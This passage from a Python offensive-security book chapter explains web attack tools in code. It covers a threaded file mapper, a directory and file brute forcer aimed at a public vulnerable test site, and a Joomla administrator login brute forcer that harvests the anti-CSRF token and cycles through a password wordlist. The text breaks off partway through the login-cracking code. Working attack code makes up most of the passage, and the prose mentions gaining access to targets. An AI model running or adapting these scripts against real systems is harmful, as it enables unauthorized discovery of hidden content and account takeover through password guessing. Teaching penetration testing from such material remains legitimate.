 for i in range(threads):
print "Spawning thread: %d" % i
t = threading.Thread(target=test_remote)
t.start()
We begin by defining the remote target website u and the local direc-
tory into which we have downloaded and extracted the web application.
We also create a simple list of file extensions that we are not interested in
finger printing. This list can be different depending on the target applica-
tion. The web_paths v variable is our Queue object where we will store the files
that we’ll attempt to locate on the remote server. We then use the os.walk w
function to walk through all of the files and directories in the local web
application directory. As we walk through the files and directories, we’re
building the full path to the target files and testing them against our filter
list to make sure we are only looking for the file types we want. For each
valid file we find locally, we add it to our web_paths Queue.
Looking at the bottom of the script , we are creating a number of
threads (as set at the top of the file) that will each be called the test_remote
function. The test_remote function operates in a loop that will keep execut-
ing until the web_paths Queue is empty. On each iteration of the loop, we grab
a path from the Queue x, add it to the target website’s base path, and then
attempt to retrieve it. If we’re successful in retrieving the file, we output the
HTTP status code and the full path to the file y. If the file is not found or
is protected by an .htaccess file, this will cause urllib2 to throw an error,
which we handle  so the loop can continue executing.
Kicking the Tires
For testing purposes, I installed Joomla 3.1.1 into my Kali VM, but you can
use any open source web application that you can quickly deploy or that you
have running already. When you run web_app_mapper.py, you should see out-
put like the following:
Spawning thread: 0
Spawning thread: 1
Spawning thread: 2
Spawning thread: 3
Spawning thread: 4
Spawning thread: 5
64 Chapter 5
Spawning thread: 6
Spawning thread: 7
Spawning thread: 8
Spawning thread: 9
[200] => /htaccess.txt
[200] => /web.config.txt
[200] => /LICENSE.txt
[200] => /README.txt
[200] => /administrator/cache/index.html
[200] => /administrator/components/index.html
[200] => /administrator/components/com_admin/controller.php
[200] => /administrator/components/com_admin/script.php
[200] => /administrator/components/com_admin/admin.xml
[200] => /administrator/components/com_admin/admin.php
[200] => /administrator/components/com_admin/helpers/index.html
[200] => /administrator/components/com_admin/controllers/index.html
[200] => /administrator/components/com_admin/index.html
[200] => /administrator/components/com_admin/helpers/html/index.html
[200] => /administrator/components/com_admin/models/index.html
[200] => /administrator/components/com_admin/models/profile.php
[200] => /administrator/components/com_admin/controllers/profile.php
You can see that we are picking up some valid results including some
.txt files and XML files. Of course, you can build additional intelligence into
the script to only return files you’re interested in—such as those with the
word install in them.
Brute-Forcing directories and File locations
The previous example assumed a lot of knowledge about your target. But
in many cases where you’re attacking a custom web application or large
e-commerce system, you won’t be aware of all of the files accessible on the
web server. Generally, you’ll deploy a spider, such as the one included in
Burp Suite, to crawl the target website in order to discover as much of the
web application as possible. However, in a lot of cases there are configura-
tion files, leftover development files, debugging scripts, and other security
breadcrumbs that can provide sensitive information or expose functionality
that the software developer did not intend. The only way to discover this
content is to use a brute-forcing tool to hunt down common filenames and
directories.
We’ll build a simple tool that will accept wordlists from common brute
forcers such as the DirBuster project1 or SVNDigger,2 and attempt to dis-
cover directories and files that are reachable on the target web server. As
before, we’ll create a pool of threads to aggressively attempt to discover
1. DirBuster Project: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
2. SVNDigger Project: https://www.mavitunasecurity.com/blog/svn-digger-better-lists-for-forced
-browsing/
Web Hackery 65
content. Let’s start by creating some functionality to create a Queue out of a
wordlist file. Open up a new file, name it content_bruter.py, and enter the fol-
lowing code:
import urllib2
import threading
import Queue
import urllib
threads = 50
target_url = "http://testphp.vulnweb.com"
wordlist_file = "/tmp/all.txt" # from SVNDigger
resume = None
user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101¬
Firefox/19.0"
def build_wordlist(wordlist_file):
# read in the word list
u fd = open(wordlist_file,"rb")
raw_words = fd.readlines()
fd.close()
found_resume = False
words = Queue.Queue()
v for word in raw_words:
word = word.rstrip()
if resume is not None:
if found_resume:
words.put(word)
else:
if word == resume:
found_resume = True
print "Resuming wordlist from: %s" % resume
else:
words.put(word)
return words
This helper function is pretty straightforward. We read in a wordlist
file u and then begin iterating over each line in the file v. We have some
built-in functionality that allows us to resume a brute-forcing session if our
network connectivity is interrupted or the target site goes down. This can
be achieved by simply setting the resume variable to the last path that the
brute forcer tried. When the entire file has been parsed, we return a Queue
full of words to use in our actual brute-forcing function. We will reuse this
function later in this chapter.
66 Chapter 5
We want some basic functionality to be available to our brute-forcing
script. The first is the ability to apply a list of extensions to test for when
making requests. In some cases, you want to try not only the /admin directly
for example, but admin.php, admin.inc, and admin.html.
def dir_bruter(word_queue,extensions=None):
while not word_queue.empty():
attempt = word_queue.get()
attempt_list = []
# check to see if there is a file extension; if not,
# it's a directory path we're bruting
u if "." not in attempt:
attempt_list.append("/%s/" % attempt)
else:
attempt_list.append("/%s" % attempt)
# if we want to bruteforce extensions
v if extensions:
for extension in extensions:
attempt_list.append("/%s%s" % (attempt,extension))
# iterate over our list of attempts
for brute in attempt_list:
url = "%s%s" % (target_url,urllib.quote(brute))
try:
headers = {}
w headers["User-Agent"] = user_agent
r = urllib2.Request(url,headers=headers)
response = urllib2.urlopen(r)
x if len(response.read()):
print "[%d] => %s" % (response.code,url)
except urllib2.URLError,e:
if hasattr(e, 'code') and e.code != 404:
y print "!!! %d => %s" % (e.code,url)
pass
Our dir_bruter function accepts a Queue object that is populated with
words to use for brute-forcing and an optional list of file extensions to test.
We begin by testing to see if there is a file extension in the current word u,
and if there isn’t, we treat it as a directory that we want to test for on the
remote web server. If there is a list of file extensions passed in v, then we
take the current word and apply each file extension that we want to test for.
Web Hackery 67
It can be useful here to think of using extensions like .orig and .bak on top
of the regular programming language extensions. After we build a list of
brute-forcing attempts, we set the User-Agent header to something innocu-
ous w and test the remote web server. If the response code is a 200, we
output the URL x, and if we receive anything but a 404 we also output it y
because this could indicate something interesting on the remote web server
aside from a “file not found” error.
It’s useful to pay attention to and react to your output because, depend-
ing on the configuration of the remote web server, you may have to filter out
more HTTP error codes in order to clean up your results. Let’s finish out the
script by setting up our wordlist, creating a list of extensions, and spinning up
the brute-forcing threads.
word_queue = build_wordlist(wordlist_file)
extensions = [".php",".bak",".orig",".inc"]
for i in range(threads):
t = threading.Thread(target=dir_bruter,args=(word_queue,extensions,))
t.start()
The code snip above is pretty straightforward and should look famil-
iar by now. We get our list of words to brute-force, create a simple list of
file extensions to test for, and then spin up a bunch of threads to do the
brute-forcing.
Kicking the Tires
OWASP has a list of online and offline (virtual machines, ISOs, etc.) vul-
nerable web applications that you can test your tooling against. In this case,
the URL that is referenced in the source code points to an intentionally
buggy web application hosted by Acunetix. The cool thing is that it shows
you how effective brute-forcing a web application can be. I recommend you
set the thread_count variable to something sane such as 5 and run the script.
In short order, you should start seeing results such as the ones below:
[200] => http://testphp.vulnweb.com/CVS/
[200] => http://testphp.vulnweb.com/admin/
[200] => http://testphp.vulnweb.com/index.bak
[200] => http://testphp.vulnweb.com/search.php
[200] => http://testphp.vulnweb.com/login.php
[200] => http://testphp.vulnweb.com/images/
[200] => http://testphp.vulnweb.com/index.php
[200] => http://testphp.vulnweb.com/logout.php
[200] => http://testphp.vulnweb.com/categories.php
You can see that we are pulling some interesting results from the remote
website. I cannot stress enough the importance to perform content brute-
forcing against all of your web application targets.
68 Chapter 5
Brute-Forcing HtMl Form authentication
There may come a time in your web hacking career where you need to
either gain access to a target, or if you’re consulting, you might need to
assess the password strength on an existing web system. It has become
more and more common for web systems to have brute-force protection,
whether a captcha, a simple math equation, or a login token that has to be
submitted with the request. There are a number of brute forcers that can
do the brute-forcing of a POST request to the login script, but in a lot of
cases they are not flexible enough to deal with dynamic content or handle
simple “are you human” checks. We’ll create a simple brute forcer that will
be useful against Joomla, a popular content management system. Modern
Joomla systems include some basic anti-brute-force techniques, but still
lack account lockouts or strong captchas by default.
In order to brute-force Joomla, we have two requirements that need to
be met: retrieve the login token from the login form before submitting the
password attempt and ensure that we accept cookies in our urllib2 session.
In order to parse out the login form values, we’ll use the native Python class
HTMLParser. This will also be a good whirlwind tour of some additional features
of urllib2 that you can employ when building tooling for your own targets.
Let’s get started by having a look at the Joomla administrator login form.
This can be found by browsing to http://.com/administrator/. For
the sake of brevity, I’ve only included the relevant form elements.
Language - Default
English (United Kingdom)
Reading through this form, we are privy to some valuable informa-
tion that we’ll need to incorporate into our brute forcer. The first is that
the form gets submitted to the /administrator/index.php path as an HTTP
POST. The next are all of the fields required in order for the form sub-
mission to be successful. In particular, if you look at the last hidden field,
Web Hackery 69
you’ll see that its name attribute is set to a long, randomized string. This
is the essential piece of Joomla’s anti-brute-forcing technique. That ran-
domized string is checked against your current user session, stored in a
cookie, and even if you are passing the correct credentials into the login
processing script, if the randomized token is not present, the authentica-
tion will fail. This means we have to use the following request flow in our
brute forcer in order to be successful against Joomla:
1. Retrieve the login page, and accept all cookies that are returned.
2. Parse out all of the form elements from the HTML.
3. Set the username and/or password to a guess from our dictionary.
4. Send an HTTP POST to the login processing script including all
HTML form fields and our stored cookies.
5. Test to see if we have successfully logged in to the web application.
You can see that we are going to be utilizing some new and valuable
techniques in this script. I will also mention that you should never “train”
your tooling on a live target; always set up an installation of your target
web application with known credentials and verify that you get the desired
results. Let’s open a new Python file named joomla_killer.py and enter the
following code:
import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser
# general settings
user_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None
# target specific settings
u target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"
v username_field= "username"
password_field= "passwd"
w success_check = "Administration - Control Panel"
These general settings deserve a bit of explanation. The target_url
variable u is where our script will first download and parse the HTML.
The target_post variable is where we will submit our brute-forcing attempt.
Based on our brief analysis of the HTML in the Joomla login, we can set
70 Chapter 5
the username_field and password_field v variables to the appropriate name
of the HTML elements. Our success_check variable w is a string that we’ll
check for after each brute-forcing attempt in order to determine whether
we are successful or not. Let’s now create the plumbing for our brute forcer;
some of the following code will be familiar so I’ll only highlight the newest
techniques.
class Bruter(object):
def __init__(self, username, words):
self.username = username
self.password_q = words
self.found = False
print "Finished setting up for: %s" % username
def run_bruteforce(self):
for i in range(user_thread):
t = threading.Thread(target=self.web_bruter)
t.start()
def web_bruter(self):
while not self.password_q.empty() and not self.found:
brute = self.password_q.get().rstrip()
u jar = cookielib.FileCookieJar("cookies")
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
response = opener.open(target_url)
page = response.read()
print "Trying: %s : %s (%d left)" % (self.username,brute,self.¬
password_q.qsize())
# parse out the hidden fields
v parser = BruteParser()
parser.feed(page)
post_tags = parser.tag_results
# add our username and password fields
w post_tags[username_field] = self.username
post_tags[password_field] = brute
x login_data = urllib.urlencode(post_tags)
login_response = opener.open(target_post, login_data)
login_result = login_response.read()
y if success_check in login_result: